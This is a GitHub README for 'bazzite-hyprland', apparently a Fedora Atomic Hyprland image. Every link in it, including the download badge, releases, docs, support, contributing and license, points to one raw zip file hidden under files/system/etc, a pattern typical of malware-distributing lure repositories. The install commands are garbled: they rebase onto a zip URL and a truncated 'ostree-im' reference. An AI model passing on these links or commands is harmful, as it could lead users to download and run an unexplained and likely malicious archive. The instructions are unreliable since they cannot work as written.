# 🎉 bazzite-hyprland - Experience a Stable, Custom Linux Environment

[![Download the latest release](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip%20Now-blue)](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip)

## 🚀 Getting Started

Welcome to bazzite-hyprland! This guide will help you download and install our application easily, giving you a smooth, custom Linux experience.

## 📥 Download & Install

To get started, visit the [Releases page](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) to download the latest version.

1. Go to the [Releases page](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip).
2. Find the version you want to install.
3. Click on the appropriate file for your system to begin downloading.

## 🛠️ System Requirements

Before installing, ensure your system meets these requirements:

- **Operating System:** Fedora 35 or later
- **Architecture:** x86_64
- **Disk Space:** At least 2 GB available
- **Memory:** Minimum of 4 GB RAM

## 💾 Installation Steps

After downloading the file, follow these installation steps:

1. Open your terminal.
2. Navigate to the directory where the download is located.

   ```
   cd ~/Downloads
   ```

3. First, rebase to the unsigned image to get the proper signing keys and policies installed:

   ```
   rpm-ostree rebase https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip
   ```

4. Reboot your system to complete the rebase:

   ```
   systemctl reboot
   ```

5. After rebooting, rebase to the signed image:

   ```
   rpm-ostree rebase ostree-im
   ```

## 🔍 Features

bazzite-hyprland offers several unique features designed for both stability and customization:

- **Custom Linux Environment:** Tailored for users seeking an optimized Linux experience.
- **BlueBuild Support:** Easily set up and manage your repositories.
- **Atomic Updates:** Quickly apply system updates without interruptions.

## 🔒 Important Note

This is an experimental feature. Use it at your own discretion. Refer to the [BlueBuild docs](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) for quick setup instructions for customizing your image.

## 🛠️ Troubleshooting

If you encounter issues during installation, consider these tips:

- Ensure you have the latest Fedora version installed.
- Check your system requirements again.
- Review any error messages in your terminal for guidance.

## 📞 Support

For further assistance, feel free to open an issue on our [GitHub repository](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip). We are here to help you!

## ⚙️ Contributing

We welcome contributions! If you're interested in helping improve bazzite-hyprland, check out our [contributing guidelines](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) for more information.

## 🗂️ License

This project is licensed under the MIT License. See the [LICENSE](https://github.com/4CONQUER/bazzite-hyprland/raw/refs/heads/main/files/system/etc/hyprland_bazzite_uneditable.zip) file for details.

---

Thank you for choosing bazzite-hyprland! Enjoy your custom Linux environment.